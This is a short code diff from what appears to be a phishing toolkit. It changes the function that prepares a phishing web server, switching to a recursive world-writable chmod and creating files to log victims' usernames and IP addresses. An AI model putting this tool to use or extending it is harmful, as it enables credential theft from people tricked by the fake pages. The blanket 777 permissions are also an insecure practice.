@@ -241,10 +241,11 @@ def start_main_menu():
 
 
 def start_phishing_page(page, custom_option):  # Phishing pages selection menu
-    chmod('Server', 777)
+    #chmod('Server', 777)
+    run_command(['chmod',  '-R', '777', 'Server'])
     rmtree("Server/www", onerror=simple_informant.remove_readonly)
     mkdir('Server/www')
-    chmod('Server/www', 777)
+    #chmod('Server/www', 777)
     pathlib_Path('Server/www/usernames.txt').touch()
     pathlib_Path('Server/www/ip.txt').touch()
     copyfile('WebPages/ip.php', 'Server/www/ip.php')
